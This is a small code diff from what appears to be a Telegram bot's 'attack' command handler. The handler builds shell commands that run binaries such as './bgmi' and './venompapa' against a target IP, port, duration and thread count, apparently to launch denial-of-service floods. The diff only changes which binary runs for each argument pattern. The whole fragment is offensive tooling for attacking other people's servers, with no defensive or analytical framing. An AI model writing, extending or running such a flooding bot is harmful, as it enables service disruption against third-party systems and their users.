@@ -674,9 +674,9 @@ async def attack(update: Update, context: CallbackContext):
 
     # Determine the attack command based on the argument type
     if argument_type == 3:
-        attack_command = f"./venompapa {ip} {port} {duration} 1200"
+        attack_command = f"./bgmi {ip} {port} {duration} 1200"
     elif argument_type == 4:
-        attack_command = f"./ALONE {ip} {port} {duration} {threads} "
+        attack_command = f"./venompapa {ip} {port} {duration} {threads} 1200"
     elif argument_type == 5:
         attack_command = f"./TEST {ip} {port} {duration} {byte_size} {threads} "
 
